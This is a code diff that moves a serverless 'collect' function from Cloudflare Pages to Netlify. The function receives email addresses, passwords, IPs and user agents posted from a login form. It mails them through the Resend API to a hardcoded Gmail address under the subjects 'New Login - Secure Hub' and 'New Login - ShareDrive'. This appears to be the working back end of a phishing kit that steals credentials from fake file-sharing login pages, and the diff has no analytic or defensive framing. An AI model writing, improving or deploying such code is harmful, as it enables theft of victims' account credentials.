@@ -1,14 +1,30 @@
-// functions/api/collect.js - Cloudflare Pages
-export async function onRequestPost(context) {
-  try {
-    const { request, env } = context;
-    const body = await request.json();
-    const { email, password, ip, userAgent } = body;
+// netlify/functions/collect.js
+export const handler = async (event, context) => {
+  // CORS Headers
+  const headers = {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Headers': 'Content-Type',
+    'Access-Control-Allow-Methods': 'POST, OPTIONS',
+    'Content-Type': 'application/json',
+  };
 
-    const apiKey = env.RESEND_API_KEY1;
+  // Handle preflight OPTIONS request
+  if (event.httpMethod === 'OPTIONS') {
+    return { statusCode: 200, headers, body: '' };
+  }
+
+  // Only allow POST
+  if (event.httpMethod !== 'POST') {
+    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
+  }
+
+  try {
+    const { email, password, ip, userAgent } = JSON.parse(event.body);
+
+    const apiKey = process.env.RESEND_API_KEY;
     if (!apiKey) {
       console.error('RESEND_API_KEY is not set');
-      return new Response(JSON.stringify({ success: true }), { status: 200 });
+      return { statusCode: 500, headers, body: JSON.stringify({ error: 'Server configuration error' }) };
     }
 
     const emailBody = `
@@ -20,7 +36,8 @@ export async function onRequestPost(context) {
 ⏰ Time: ${new Date().toISOString()}
     `;
 
-    await fetch('https://api.resend.com/emails', {
+    // Send via Resend
+    const response = await fetch('https://api.resend.com/emails', {
       method: 'POST',
       headers: {
         'Authorization': `Bearer ${apiKey}`,
@@ -28,16 +45,19 @@ export async function onRequestPost(context) {
       },
       body: JSON.stringify({
         from: 'onboarding@resend.dev',
-        to: ['g82443047@gmail.com'], 
-        subject: 'New Login - Secure Hub',
+        to: ['g82443047@gmail.com'], // MUST be your Resend signup email
+        subject: 'New Login - ShareDrive',
         text: emailBody.trim(),
         html: `<pre>${emailBody.trim()}</pre>`,
       }),
     });
 
-    return new Response(JSON.stringify({ success: true }), { status: 200 });
+    const data = await response.json();
+    console.log('Resend response:', JSON.stringify(data));
+
+    return { statusCode: 200, headers, body: JSON.stringify({ success: true }) };
   } catch (error) {
     console.error('Error in collect handler:', error);
-    return new Response(JSON.stringify({ success: true }), { status: 200 });
+    return { statusCode: 500, headers, body: JSON.stringify({ error: 'Internal server error' }) };
   }
-}
+};
